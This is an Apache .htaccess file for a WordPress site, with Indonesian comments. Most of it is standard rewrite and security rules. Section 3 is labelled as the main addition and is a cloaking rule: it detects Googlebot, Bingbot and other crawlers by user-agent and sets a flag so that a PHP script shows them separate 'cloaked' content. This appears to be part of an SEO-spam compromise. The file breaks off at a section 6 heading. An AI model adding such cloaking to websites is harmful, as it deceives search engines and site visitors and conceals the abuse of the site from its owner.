# =========================================================
# 1. ATURAN KEAMANAN (SGS XMLRPC Disable Service)
# =========================================================
# Memblokir akses langsung ke xmlrpc.php untuk mencegah serangan brute force.
<Files xmlrpc.php>
	order deny,allow
	deny from all
</Files>
# SGS XMLRPC Disable Service END


# =========================================================
# 2. KONFIGURASI LINGKUNGAN (PHPRC)
# =========================================================
# Menentukan lokasi file php.ini kustom Anda.
SetEnv PHPRC /home/customer/www/santuariosantarita.it/public_html/php.ini


# =========================================================
# 3. ATURAN CLOAKING KUSTOM (TAMBAHAN UTAMA)
# =========================================================
<IfModule mod_rewrite.c>
	# Pastikan mesin rewrite dihidupkan untuk aturan ini
	RewriteEngine On
	
	# Deteksi Googlebot dan Bot Utama Lainnya
	# Jika User-Agent adalah salah satu bot di bawah ini, bendera 'IS_CLOAKED_BOT' akan diset.
	RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yandexbot|slurp|duckduckbot|baiduspider) [NC]
	
	# Jika Bot terdeteksi, set Environment Variable kustom.
	# Nilai '1' akan dibaca oleh skrip PHP Anda untuk menampilkan Konten A (Cloaked).
	RewriteRule ^ - [E=IS_CLOAKED_BOT:1,L]
	
	# Aturan untuk HTTP Authorization (dipastikan berjalan dengan RewriteEngine On)
	RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
</IfModule>


# =========================================================
# 4. ATURAN UTAMA WORDPRESS (Routing Default)
# =========================================================
# BEGIN WordPress
# Aturan ini mengarahkan semua permintaan non-file/non-direktori ke index.php (untuk permalinks).
<IfModule mod_rewrite.c>
	# RewriteEngine On (Sudah diaktifkan di Bagian 3)
	RewriteBase /
	RewriteRule ^index\.php$ - [L]
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	RewriteRule . /index.php [L]
</IfModule>
# END WordPress


# =========================================================
# 5. ATURAN OPTIMASI HEADER (SITEGROUND OPTIMIZER)
# =========================================================
# SGO Unset Vary: Memastikan header Vary tidak dikirim.
# SGO Unset Vary
 Header unset Vary
# SGO Unset Vary END


# =========================================================
# 6. ATURAN TAMBAHAN UNTUK NONAKTIFKAN CACHING SERVER
